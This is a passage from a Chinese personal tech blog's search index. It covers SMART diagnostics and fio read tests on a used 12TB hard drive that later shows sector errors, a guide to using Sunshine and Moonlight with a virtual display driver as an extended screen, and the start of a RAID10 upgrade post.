Seek_Time_Performance   0x0005   140   140   020    Pre-fail  Offline      -       15\n  9 Power_On_Hours          0x0012   097   097   000    Old_age   Always       -       27988\n 10 Spin_Retry_Count        0x0013   100   100   060    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   000    Old_age   Always       -       1510\n 22 Unknown_Attribute       0x0023   100   100   025    Pre-fail  Always       -       100\n 45 Unknown_Attribute       0x0023   100   100   001    Pre-fail  Always       -       1095233372415\n192 Power-Off_Retract_Count 0x0032   099   099   000    Old_age   Always       -       1984\n193 Load_Cycle_Count        0x0012   099   099   000    Old_age   Always       -       1984\n194 Temperature_Celsius     0x0002   166   166   000    Old_age   Always       -       36 (Min/Max 12/57)\n196 Reallocated_Event_Count 0x0032   100   100   000    Old_age   Always       -       0\n197 Current_Pending_Sector  0x0022   100   100   000    Old_age   Always       -       0\n198 Offline_Uncorrectable   0x0008   100   100   000    Old_age   Offline      -       0\n199 UDMA_CRC_Error_Count    0x000a   200   200   000    Old_age   Always       -       0\n231 Temperature_Celsius     0x0032   100   100   000    Old_age   Always       -       0\n241 Total_LBAs_Written      0x0012   100   100   000    Old_age   Always       -       2336937998966\n242 Total_LBAs_Read         0x0012   100   100   000    Old_age   Always       -       3023123194501\n\nSMART Error Log Version: 1\nNo Errors Logged\n\nSMART Self-test log structure revision number 1\nNum  Test_Description    Status                  Remaining  LifeTime(hours)  LBA_of_first_error\n# 1  Short offline       Completed without error       00%     25523         -\n# 2  Vendor (0x70)       Completed without error       00%     25464         -\n# 3  Vendor (0x71)       Completed without error       00%     25464         -\n</code></pre> <pre><code>root@ryzen-pve \u279c  ~ fio --loops=3 --filename=/dev/sda1 --bs=1M --direct=1 --iodepth=32 --numjobs 1 --group_reporting --size=4g --runtime=60 --name SeqRead --rw=read --ioengine=libaio --readonly\nSeqRead: (g=0): rw=read, bs=(R) 1024KiB-1024KiB, (W) 1024KiB-1024KiB, (T) 1024KiB-1024KiB, ioengine=libaio, iodepth=32\nfio-3.33\nStarting 1 process\nJobs: 1 (f=1): [R(1)][100.0%][r=235MiB/s][r=235 IOPS][eta 00m:00s]\nSeqRead: (groupid=0, jobs=1): err= 0: pid=65694: Sun Nov  3 00:18:28 2024\n  read: IOPS=231, BW=231MiB/s (243MB/s)(12.0GiB/53094msec)\n    slat (usec): min=9, max=84346, avg=2498.28, stdev=6588.19\n    clat (msec): min=28, max=2272, avg=135.46, stdev=86.26\n     lat (msec): min=28, max=2272, avg=137.95, stdev=86.36\n    clat percentiles (msec):\n     |  1.00th=[   77],  5.00th=[   87], 10.00th=[  113], 20.00th=[  118],\n     | 30.00th=[  123], 40.00th=[  129], 50.00th=[  133], 60.00th=[  136],\n     | 70.00th=[  138], 80.00th=[  142], 90.00th=[  153], 95.00th=[  161],\n     | 99.00th=[  228], 99.50th=[  279], 99.90th=[ 2232], 99.95th=[ 2232],\n     | 99.99th=[ 2265]\n   bw (  KiB/s): min=153600, max=262144, per=99.92%, avg=236814.49, stdev=18559.05, samples=106\n   iops        : min=  150, max=  256, avg=231.26, stdev=18.12, samples=106\n  lat (msec)   : 50=0.08%, 100=7.91%, 250=91.28%, 500=0.43%, 2000=0.20%\n  lat (msec)   : &gt;=2000=0.11%\n  cpu          : usr=0.06%, sys=0.57%, ctx=7105, majf=7, minf=8203\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.1%, 8=0.2%, 16=0.4%, 32=99.2%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=12288,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\n\nRun status group 0 (all jobs):\n   READ: bw=231MiB/s (243MB/s), 231MiB/s-231MiB/s (243MB/s-243MB/s), io=12.0GiB (12.9GB), run=53094-53094msec\n\nDisk stats (read/write):\n  sda: ios=24101/165, merge=0/13, ticks=3163421/73767, in_queue=3238734, util=98.45%\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#2025-03-14","title":"2025-03-14","text":"<pre><code>root@ryzen-pve \u279c  ~ smartctl -a /dev/sda\nsmartctl 7.3 2022-02-28 r5338 [x86_64-linux-6.8.12-2-pve] (local build)\nCopyright (C) 2002-22, Bruce Allen, Christian Franke, www.smartmontools.org\n\n=== START OF INFORMATION SECTION ===\nDevice Model:     HUH721212ALE601\nSerial Number:    8CG3VLKE\nLU WWN Device Id: 5 000cca 26fc1c0f6\nFirmware Version: LEGL0002\nUser Capacity:    12,000,138,625,024 bytes [12.0 TB]\nSector Sizes:     512 bytes logical, 4096 bytes physical\nRotation Rate:    7200 rpm\nForm Factor:      3.5 inches\nDevice is:        Not in smartctl database 7.3/5319\nATA Version is:   ACS-2, ATA8-ACS T13/1699-D revision 4\nSATA Version is:  SATA 3.2, 6.0 Gb/s (current: 6.0 Gb/s)\nLocal Time is:    Fri Mar 14 19:16:11 2025 CST\nSMART support is: Available - device has SMART capability.\nSMART support is: Enabled\n\nRead SMART Thresholds failed: scsi error medium or hardware error (serious)\n\n=== START OF READ SMART DATA SECTION ===\nSMART overall-health self-assessment test result: PASSED\n\nGeneral SMART Values:\nOffline data collection status:  (0x80) Offline data collection activity\n                                        was never started.\n                                        Auto Offline Data Collection: Enabled.\nSelf-test execution status:      (   0) The previous self-test routine completed\n                                        without error or no self-test has ever\n                                        been run.\nTotal time to complete Offline\ndata collection:                (   87) seconds.\nOffline data collection\ncapabilities:                    (0x5b) SMART execute Offline immediate.\n                                        Auto Offline data collection on/off support.\n                                        Suspend Offline collection upon new\n                                        command.\n                                        Offline surface scan supported.\n                                        Self-test supported.\n                                        No Conveyance Self-test supported.\n                                        Selective Self-test supported.\nSMART capabilities:            (0x0003) Saves SMART data before entering\n                                        power-saving mode.\n                                        Supports SMART auto save timer.\nError logging capability:        (0x01) Error logging supported.\n                                        General Purpose Logging supported.\nShort self-test routine\nrecommended polling time:        (   1) minutes.\nExtended self-test routine\nrecommended polling time:        (   1) minutes.\nSCT capabilities:              (0x003d) SCT Status supported.\n                                        SCT Error Recovery Control supported.\n                                        SCT Feature Control supported.\n                                        SCT Data Table supported.\n\nSMART Attributes Data Structure revision number: 16\nVendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000b   095   095   ---    Pre-fail  Always       -       10\n  2 Throughput_Performance  0x0005   132   132   ---    Pre-fail  Offline      -       96\n  3 Spin_Up_Time            0x0007   182   182   ---    Pre-fail  Always       -       324 (Average 399)\n  4 Start_Stop_Count        0x0012   100   100   ---    Old_age   Always       -       1604\n  5 Reallocated_Sector_Ct   0x0033   100   100   ---    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000b   095   095   ---    Pre-fail  Always       -       5\n  8 Seek_Time_Performance   0x0005   140   140   ---    Pre-fail  Offline      -       15\n  9 Power_On_Hours          0x0012   096   096   ---    Old_age   Always       -       31151\n 10 Spin_Retry_Count        0x0013   100   100   ---    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   ---    Old_age   Always       -       1520\n 22 Unknown_Attribute       0x0023   100   100   ---    Pre-fail  Always       -       100\n 45 Unknown_Attribute       0x0023   100   100   ---    Pre-fail  Always       -       1095233372415\n192 Power-Off_Retract_Count 0x0032   099   099   ---    Old_age   Always       -       2190\n193 Load_Cycle_Count        0x0012   099   099   ---    Old_age   Always       -       2190\n194 Temperature_Celsius     0x0002   187   187   ---    Old_age   Always       -       32 (Min/Max 12/57)\n196 Reallocated_Event_Count 0x0032   100   100   ---    Old_age   Always       -       0\n197 Current_Pending_Sector  0x0022   100   100   ---    Old_age   Always       -       40\n198 Offline_Uncorrectable   0x0008   100   100   ---    Old_age   Offline      -       5\n199 UDMA_CRC_Error_Count    0x000a   200   200   ---    Old_age   Always       -       0\n231 Temperature_Celsius     0x0032   100   100   ---    Old_age   Always       -       1\n241 Total_LBAs_Written      0x0012   100   100   ---    Old_age   Always       -       2365150154407\n242 Total_LBAs_Read         0x0012   100   100   ---    Old_age   Always       -       3026328281010\n\nRead SMART Log Directory failed: scsi error medium or hardware error (serious)\n\nRead SMART Error Log failed: scsi error medium or hardware error (serious)\n\nRead SMART Self-test Log failed: scsi error medium or hardware error (serious)\n\nRead SMART Selective Self-test Log failed: scsi error medium or hardware error (serious)\n</code></pre> <pre><code>root@ryzen-pve \u279c  ~ l /mnt/Disk3/\nls: cannot access '/mnt/Disk3/\u767e\u5ea6\u7f51\u76d8': Input/output error\nls: cannot access '/mnt/Disk3/Alist-Guest': Input/output error\ntotal 4.1G\nd????????? ? ?    ?       ?            ? Alist-Guest\ndrwxrwxr-x 5 yfy  yfy  4.0K Nov 16 21:56 BT\n-rw-r--r-- 1 root root 4.0G Mar 13 16:22 fio.img\ndrwx------ 2 root root  16K Nov  4 23:15 lost+found\nd????????? ? ?    ?       ?            ? \u767e\u5ea6\u7f51\u76d8\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/","title":"\u4f7f\u7528\u5176\u5b83\u8bbe\u5907\u4f5c\u4e3a\u6269\u5c55\u5c4f\u5e55","text":"<p>\u5047\u5982\u5165\u4f60\u521a\u597d\u6709\u4e24\u53f0\u7b14\u8bb0\u672c\uff0c\u6216\u8005\u7b14\u8bb0\u672c\u548c\u4e00\u4e2a\u5927\u5c4f\u7684\u5e73\u677f\u3002\u6709\u4ec0\u4e48\u529e\u6cd5\u628a\u5176\u4e2d\u4e00\u53f0\u8ba1\u7b97\u673a\u7684\u5c4f\u5e55\u4f5c\u4e3a\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4f7f\u7528\u5462\uff1f</p> <p>\u8c03\u7814\u540e\uff0c\u5e38\u89c1\u7684\u9009\u62e9\u662f spacedesk\uff0c\u6548\u679c\u8fd8\u53ef\u4ee5\u3002\u4e0d\u8fc7\u6211\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u5373\u4f7f\u4e24\u53f0\u7b14\u8bb0\u672c\u6709\u7ebf\u8fde\u63a5\u5230\u8def\u7531\u5668\uff0c\u8fd8\u662f\u9047\u5230\u4e86\u5361\u987f\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u5728\u8003\u8651\u662f\u5426\u6709\u5176\u4ed6\u9009\u62e9\uff0c\u8981\u662f\u80fd\u591f\u6709 sunshine+moonlight \u90a3\u4e48\u987a\u6ed1\u5c31\u597d\u4e86\uff0c\u7a81\u7136\u4e00\u4e2a\u60f3\u6cd5\u5192\u5165\u8111\u6d77\u4e2d\u2014\u2014\u662f\u5426\u80fd\u7528 sunshine \u5b9e\u73b0\u6269\u5c55\u5c4f\u5e55\u5462\uff1f\u4e8e\u662f\u5c1d\u8bd5\u8d77\u6765\u3002</p> <p>\u5728\u7b2c\u4e00\u53f0\u7b14\u8bb0\u672c\u4e0a\u5b89\u88c5\u597d sunshine \u4f5c\u4e3a\u670d\u52a1\u7aef\u3002\u7b14\u8bb0\u672c CPU \u4e3a i5 1135g7\uff0c\u8f7b\u8584\u672c\u3002\u7531\u4e8e intel \u7684\u7f16\u89e3\u7801\u90fd\u633a\u5f3a\uff0c\u5916\u52a0\u4e24\u53f0\u7b14\u8bb0\u672c\u90fd\u662f\u5343\u5146\u7f51\u7ebf\u8fde\u63a5\uff0c\u6240\u4ee5\u4e0d\u592a\u62c5\u5fc3\u6027\u80fd\u95ee\u9898\u3002</p> <p>\u7b2c\u4e8c\u53f0\u7b14\u8bb0\u672c\u5b89\u88c5\u597d moonlight\uff0c\u8fde\u63a5\u3002\u7ed3\u679c\u53d1\u73b0\u53ea\u4e32\u6d41\u4e86\u7b2c\u4e00\u53f0\u7b14\u8bb0\u672c\u7684\u4e3b\u5c4f\u5e55\uff0c\u5e76\u4e14\u662f\u955c\u50cf\u6a21\u5f0f\u3002\u548c\u6240\u60f3\u8981\u7684\u6548\u679c\u4e0d\u4e00\u6837\u3002\u6211\u60f3\u8981\u7684\u662f\u65b0\u589e\u4e00\u4e2a\u5c4f\u5e55\u3002\u6000\u7740\u8fd9\u7406\u8bba\u4e0a\u5e94\u8be5\u662f\u53ef\u4ee5\u505a\u5230\u7684\u60f3\u6cd5\uff0c\u641c\u7d22\u4e86 github \u7684 issue\u3002\u7ed3\u679c\u770b\u5230\u6709\u4eba\u8ba8\u8bba\u80fd\u5426\u4e32\u6d41\u591a\u4e2a\u663e\u793a\u5668\u3002\u786e\u5b9e\uff0c\u6211\u7b14\u8bb0\u672c\u8fde\u63a5\u7684\u53e6\u4e00\u4e2a 27\u82f1\u5bf8\u663e\u793a\u5668\u90fd\u65e0\u6cd5\u4e32\u6d41\u3002\u5e94\u8be5\u6709\u529e\u6cd5\u5207\u6362\u5427\uff0c\u6211\u8fd9\u4e48\u60f3\u7740\u3002</p> <p>\u8ba8\u8bba\u4e2d\u6709\u4eba\u63d0\u5230 sunshine \u9ed8\u8ba4\u4e32\u6d41\u4e3b\u5c4f\u5e55\uff0c\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2a sunshine instance\uff0c\u6bcf\u4e2a\u8bbe\u7f6e\u4e32\u6d41\u4e0d\u540c\u5c4f\u5e55\u3002\u8fd9\u4ee4\u6211\u7a81\u7136\u60f3\u5230\uff0c\u5c82\u4e0d\u662f\u53ef\u4ee5\u5728\u7b2c\u4e00\u53f0\u7b14\u8bb0\u672c\u4e0a\u5b89\u88c5\u4e00\u4e2a\u865a\u62df\u5c4f\u5e55\uff0c\u7b2c\u4e8c\u53f0\u7b14\u8bb0\u672c\u4e32\u6d41\u8fd9\u4e2a\u865a\u62df\u5c4f\u5e55\u5c31\u53ef\u4ee5\u8fbe\u5230\u6269\u5c55\u7684\u6548\u679c\u4e86\uff1f</p> <p>\u7ed3\u679c\u975e\u5e38 Amazing \u554a\uff0c\u5c45\u7136\u771f\u7684\u5c31 work \u4e86\uff0c\u6548\u679c\u975e\u5e38\u4e1d\u6ed1\u3002\u751a\u81f3\u6211\u89c9\u5f97\u6bd4 spacedesk \u7684\u6548\u679c\u8fd8\u8981\u597d\uff0c\u6bd5\u7adf\u753b\u9762\u7684\u7801\u7387\u90fd\u53ef\u4ee5\u8c03\u6574\u3002</p> <p>\u6b64\u6587\u4e3b\u8981\u8bb0\u5f55\u4e0b\u8fd9\u4e2a usecase\uff0c\u5e76\u7b80\u5355\u8bb0\u5f55\u914d\u7f6e\u65b9\u6cd5\u3002</p>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/#spacedesk","title":"Spacedesk","text":"<p>\u8bf4\u5230\u5c06\u5e73\u677f\u4f5c\u4e3a\u7b14\u8bb0\u672c\u6269\u5c55\u5c4f\u5e55\uff0c\u6211\u6700\u65e9\u77e5\u9053\u7684\u662f spacedesk \u8fd9\u4e2a\u8f6f\u4ef6\uff0c\u5f53\u65f6\u5b83\u8fd8\u662f beta \u7248\u672c\uff0c\u4f46\u662f\u80fd\u7528\uff0c\u4e0d\u8fc7\u5bf9\u7f51\u7edc\u8981\u6c42\u975e\u5e38\u9ad8\uff0c\u5076\u5c14\u4f1a\u5361\u987f\u3002</p> <p>\u5b83\u81ea\u5df1\u5b98\u7f51\u7684\u4ecb\u7ecd</p> <p>spacedesk\u00a0software\u00a0turns\u00a0mobile\u00a0devices,\u00a0laptops\u00a0and\u00a0desktops\u00a0into\u00a0an\u00a0additional\u00a0extension\u00a0display\u00a0monitor\u00a0for\u00a0Windows machines.\u00a0Windows\u00a0can\u00a0smoothly\u00a0be\u00a0moved\u00a0to\u00a0and\u00a0from\u00a0other\u00a0connected\u00a0monitors.</p> <p>\u786e\u5b9e\u6709\u5f88\u591a\u529f\u80fd</p> <ul> <li>wifi extension monitor</li> <li>screencast\uff0c\u5171\u4eab\u5c4f\u5e55</li> <li>touch screen as PC input</li> <li>mobile device as audio input </li> </ul>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/#\u4f7f\u7528-sunshine--moonlight-\u6269\u5c55\u5c4f\u5e55","title":"\u4f7f\u7528 Sunshine + moonlight \u6269\u5c55\u5c4f\u5e55","text":"<p>\u8fd9\u91cc\u5728\u8ba8\u8bba\u662f\u5426\u53ef\u4ee5\u4e32\u6d41\u591a\u4e2a\u5c4f\u5e55\u3002\u5982\u679c\u652f\u6301\u52a8\u6001\u5207\u6362\u4e0d\u540c\u5c4f\u5e55\u662f\u6700\u597d\u7684\uff08Pico \u4e32\u6d41\u3001VD \u90fd\u652f\u6301\uff09 Run multiple instances for streaming different displays \u00b7 Issue #59 \u00b7 loki-47-6F-64/sunshine (github.com)</p> <p>\u8bc4\u8bba\u533a\u627e\u5230\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\u662f\u8fd0\u884c\u591a\u4e2a instance\uff0c\u6bcf\u4e2a\u914d\u7f6e\u4f7f\u7528\u4e0d\u540c\u7aef\u53e3\uff0c\u6bcf\u4e2a instance \u914d\u7f6e\u4e32\u6d41\u4e0d\u540c\u5c4f\u5e55\uff0c\u7136\u540e\u4f7f\u7528\u4e0d\u540c\u5ba2\u6237\u7aef\u8fde\u63a5\u5373\u53ef - https://github.com/loki-47-6F-64/sunshine/issues/59#issuecomment-1709018824</p> <p>\u4e00\u4e2a\u5f88\u597d\u7684\u4f7f\u7528\u573a\u666f\uff0c\u662f\u5728 AVP \u7b49 VR \u5934\u663e\u4e2d\u4e32\u6d41\u591a\u4e2a\u865a\u62df\u5c4f\u5e55 Dual screens by using Sunshine + Moonlight : r/VisionPro (reddit.com)</p>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/#\u5b89\u88c5\u865a\u62df\u663e\u793a\u5668","title":"\u5b89\u88c5\u865a\u62df\u663e\u793a\u5668","text":"<ul> <li>\u6700\u65e9\u4f7f\u7528\u7684\uff0c\u6709\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u63a7\u5236\u662f\u5426\u542f\u7528\u865a\u62df\u663e\u793a\u5668\u3002\u4f46\u662f\u6709\u70b9\u8822\u7684\u662f\u81ea\u542f\u52a8\u540e\uff0c\u6bcf\u6b21\u9700\u8981\u70b9\u4e24\u4e0b\u624d\u80fd\u5f00\u542f\u663e\u793a\u5668\uff08\u90a3\u6211\u81ea\u542f\u52a8\u7684\u610f\u4e49\u662f\u4ec0\u4e48\uff09\uff1aKtzeAbyss/Easy-Virtual-Display: Effortlessly create virtual displays in Windows, capable of supporting various resolutions and refresh rates, suitable for remote control or graphics card spoofing.\u5728win\u4e2d\u8f7b\u677e\u521b\u5efa\u652f\u6301\u591a\u79cd\u5206\u8fa8\u7387\u548c\u5237\u65b0\u7387\u7684\u865a\u62df\u663e\u793a\u5668\uff0c\u53ef\u7528\u4e8e\u8fdc\u7a0b\u63a7\u5236\u6216\u663e\u5361\u6b3a\u9a97\u3002 (github.com)</li> <li>star \u6570\u66f4\u591a\uff0c\u76f4\u63a5\u5728\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u5b89\u88c5\u5378\u8f7d\u9a71\u52a8\u3002\u8c8c\u4f3c\u4e0d\u4f1a\u6709\u81ea\u542f\u52a8\u95ee\u9898\uff1aitsmikethetech/Virtual-Display-Driver: Add virtual monitors to your windows 10/11 device! Works with VR, OBS, Sunshine, and/or any desktop sharing software. (github.com)</li> </ul>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/#\u6307\u5b9a-display","title":"\u6307\u5b9a Display","text":"<p>display \u5e76\u4e0d\u9ed8\u8ba4\u5c31\u662f 1\uff0c2\uff0c3 \u987a\u5e8f\u7f16\u53f7\u7684\u3002\u6bd4\u6211\u6211\u7684\u5c31\u8bbe\u7f6e\u6210\u4e86\uff0c\u9700\u8981\u4f7f\u7528 sunshine \u5b89\u88c5\u76ee\u5f55\u4e2d\u7684 <code>tools\\dxgi-info.exe</code> \u68c0\u6d4b\u3002  <pre><code>\\\\.\\DISPLAY21\n</code></pre></p> <p>Manually specify a display to use for capture. If unset, the primary display is captured. Note: If you specified a GPU above, this display must be connected to that GPU. The appropriate values can be found using the following command:  <code>tools\\dxgi-info.exe</code></p> <pre><code>D:\\Program\\Play\\Sunshine&gt;tools\\dxgi-info.exe\n====== ADAPTER =====\nDevice Name      : Intel(R) Iris(R) Xe Graphics\nDevice Vendor ID : 0x00008086\nDevice Device ID : 0x00009A49\nDevice Video Mem : 128 MiB\nDevice Sys Mem   : 0 MiB\nShare Sys Mem    : 8089 MiB\n\n    ====== OUTPUT ======\n    Output Name       : \\\\.\\DISPLAY1\n    AttachedToDesktop : yes\n    Resolution        : 2256x1504\n\n    Output Name       : \\\\.\\DISPLAY2\n    AttachedToDesktop : yes\n    Resolution        : 1920x1080\n\n    Output Name       : \\\\.\\DISPLAY21\n    AttachedToDesktop : yes\n    Resolution        : 1920x1080\n\n====== ADAPTER =====\nDevice Name      : Intel(R) Iris(R) Xe Graphics\nDevice Vendor ID : 0x00008086\nDevice Device ID : 0x00009A49\nDevice Video Mem : 128 MiB\nDevice Sys Mem   : 0 MiB\nShare Sys Mem    : 8089 MiB\n\n    ====== OUTPUT ======\n====== ADAPTER =====\nDevice Name      : Intel(R) Iris(R) Xe Graphics\nDevice Vendor ID : 0x00008086\nDevice Device ID : 0x00009A49\nDevice Video Mem : 128 MiB\nDevice Sys Mem   : 0 MiB\nShare Sys Mem    : 8089 MiB\n\n    ====== OUTPUT ======\n====== ADAPTER =====\nDevice Name      : Microsoft Basic Render Driver\nDevice Vendor ID : 0x00001414\nDevice Device ID : 0x0000008C\nDevice Video Mem : 0 MiB\nDevice Sys Mem   : 0 MiB\nShare Sys Mem    : 8089 MiB\n\n    ====== OUTPUT ======\n</code></pre>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/15/%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AE%83%E8%AE%BE%E5%A4%87%E4%BD%9C%E4%B8%BA%E6%89%A9%E5%B1%95%E5%B1%8F%E5%B9%95/#\u5173\u4e8e\u952e\u9f20\u8f93\u5165","title":"\u5173\u4e8e\u952e\u9f20\u8f93\u5165","text":"<p>\u521a\u5f00\u59cb\u6211\u8fd8\u4f7f\u7528\u4e86 barrier \u8fd9\u4e2a\u8f6f\u4ef6\uff0c\u7528\u4e8e\u5728\u4e24\u4e2a\u7b14\u8bb0\u672c\u95f4\u5171\u4eab\u9f20\u6807\uff0c\u4f46\u662f\u5176\u5b9e\u662f\u4e0d\u9700\u8981\u7684\u3002\u7b2c\u4e8c\u53f0\u7b14\u8bb0\u672c\u53ea\u7528\u4e8e\u663e\u793a\uff0c\u56e0\u6b64\u4f7f\u7528\u9f20\u6807\u7684\u8ba1\u7b97\u90fd\u662f\u5728 host \u4e0a\u8ba1\u7b97\u8f93\u51fa\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u4f7f\u7528\u7b2c\u4e00\u53f0\u7b14\u8bb0\u672c\u7684\u952e\u9f20\uff0c\u5c31\u81ea\u52a8\u5de5\u4f5c\u4e86\u3002</p> <p>\u6d4b\u8bd5\u53d1\u73b0\u7b2c\u4e8c\u53f0\u7b14\u8bb0\u672c\u7684\u9f20\u6807\u88ab\u9650\u5236\u5728\u4e86\u4e32\u6d41\u7684\u5c4f\u5e55\u533a\u57df\uff0c\u4f46\u662f\u79fb\u52a8\u5230\u5c4f\u5e55\u8fb9\u7f18\u65f6\uff0c\u80fd\u5728\u5176\u5b83\u5c4f\u5e55\u770b\u5230\u3002\u56e0\u6b64\u611f\u89c9\u53ea\u662f\u4e00\u4e2a\u8f6f\u4ef6\u9650\u5236\u3002</p> <p>\u662f\u5426\u80fd\u591f\u652f\u6301\u4e0d\u9650\u5236\u533a\u57df\uff0c\u4ece\u800c\u652f\u6301\u4f7f\u7528\u5e73\u677f\u7b49\u89e6\u5c4f\u8bbe\u5907\u4f5c\u4e3a\u7b2c\u4e00\u53f0\u7b14\u8bb0\u672c\u8f93\u5165\uff1f</p>","tags":["sunshine","\u6269\u5c55\u5c4f\u5e55","spacedesk","moonlight","virtual-display"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/","title":"\u53f0\u5f0f\u673a\u5347\u7ea7-\u786c\u4ef6\u7bc7","text":"<p>\u968f\u7740\u505a\u79cd\u8d44\u6e90\u539f\u6765\u8d8a\u591a\uff0c\u539f\u672c 4T + 2T \u7684\u673a\u68b0\u786c\u76d8\u914d\u7f6e\u4e0d\u591f\u7528\u4e86\u3002\u5373\u4f7f\u5df2\u7ecf\u505a\u4e86\u5f88\u591a\u7f13\u89e3\u63aa\u65bd\uff0c\u6bd4\u5982\u5c06\u6bd4\u8f83\u5927\u7684\u89c6\u9891\u6587\u4ef6\u8f6c\u6210 av1 \u7f16\u7801\uff084k h264\u53ef\u4ee5\u8fbe\u523030G -&gt; 6G\u7684\u6548\u679c\uff09\uff0c\u4ecd\u7136\u662f\u6349\u895f\u89c1\u8098\u3002\u968f\u7740\u6700\u8fd1\u60f3\u8981\u4e0b\u8f7d\u4e00\u4e9b VR \u6e38\u620f\u8d44\u6e90\uff0c\u786c\u76d8\u4e0d\u591f\u7528\u4e86\u8d8a\u6765\u8d8a\u660e\u663e\uff0c\u770b\u6765\u6dfb\u52a0\u786c\u76d8\u662f\u5fc5\u987b\u505a\u7684\u4e86\u3002</p> <p>\u540c\u65f6\u6211\u4e5f\u89c9\u5f97\u73b0\u6709\u7684\u6570\u636e\u7ba1\u7406\u6709\u70b9\u4e0d\u5b89\u5168\u3002\u76ee\u524d\u53ea\u5bf9\u4e00\u4e9b\u6587\u6863\u6570\u636e\u505a\u4e86\u5907\u4efd\uff0c\u7136\u800c\u4e00\u4e9b\u865a\u62df\u673a\u78c1\u76d8\u955c\u50cf\uff0c\u6bd4\u5982\u4e3b\u529b\u4f7f\u7528\u7684 windows \u865a\u62df\u673a\u7684\u78c1\u76d8\u955c\u50cf\uff0c\u7531\u4e8e\u6570\u636e\u91cf\u592a\u5927\uff0c\u53ea\u5b58\u4e86\u4e00\u4efd\u3002\u8fd9\u4e9b\u90fd\u662f\u5355\u70b9\u6545\u969c\u70b9\uff0c\u4e00\u65e6\u786c\u76d8\u574f\u4e86\uff0c\u5bf9\u6211\u7684\u5f71\u54cd\u662f\u975e\u5e38\u5927\u7684\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u5bb9\u91cf\u548c\u5b89\u5168\u6027\u7684\u95ee\u9898\uff0c\u51b3\u5b9a\u5728\u53f0\u5f0f\u673a\u4e0a\u6dfb\u52a0\u4e00\u4e9b\u673a\u68b0\u786c\u76d8\u7ec4 raid10\u3002</p> <p>\u4e3a\u4ec0\u4e48\u662f raid10</p> <p>\u6709\u4e24\u4e2a\u539f\u56e0\uff0c\u4e00\u4e2a\u662f raid 10 \u91cd\u5efa\u65f6\u66f4\u5b89\u5168\u3002\u4e0d\u50cf raid 5 \u91cd\u5efa\u65f6\u5b58\u5728 URE \u95ee\u9898\uff08\u6307\u9700\u8981\u8bfb\u53d6\u9635\u5217\u5168\u90e8\u7684\u6570\u636e\uff0c\u6570\u636e\u91cf\u5927\uff0c\u6709\u5f88\u5927\u6982\u7387\u9047\u5230 URE \u9519\u8bef\u5bfc\u81f4\u91cd\u5efa\u5931\u8d25\uff09\uff0craid 10 \u53ea\u9700\u8981\u8bfb\u53d6\u4e00\u4e2a mirror 